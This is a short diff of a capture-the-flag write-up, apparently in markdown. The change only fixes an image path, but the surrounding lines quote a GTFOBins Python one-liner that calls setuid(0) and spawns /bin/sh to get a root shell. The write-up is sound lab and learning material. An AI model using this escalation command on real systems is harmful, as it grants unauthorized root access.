@@ -313,7 +313,7 @@ Using the [GTFO Bins](https://gtfobins.org/gtfobins/python/) resource we found a
 
 `python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'`
 
-![[Pasted image 20260209113335.png]]
+![[Images/Pasted image 20260209113335.png]]
 
 We pop the root shell quickly find the root flag.
 
